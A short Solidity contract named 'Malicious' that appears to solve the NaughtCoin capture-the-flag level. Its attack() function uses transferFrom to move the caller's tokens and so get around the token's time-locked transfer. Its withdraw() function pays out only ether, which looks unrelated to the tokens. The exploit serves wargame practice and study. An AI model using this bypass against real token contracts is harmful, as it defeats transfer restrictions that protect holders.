// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract Malicious {

    address payable _owner;
    NaughtCoin public naughtCoin;

    constructor(address naughtCoin_) {
        _owner = payable(msg.sender);
        naughtCoin = NaughtCoin(naughtCoin_);
    }

    function withdraw() public {
        require(msg.sender == _owner);
        _owner.transfer(address(this).balance);
    }

    function attack(uint256 amount) public {
        naughtCoin.transferFrom(msg.sender, address(this), amount);
    }

}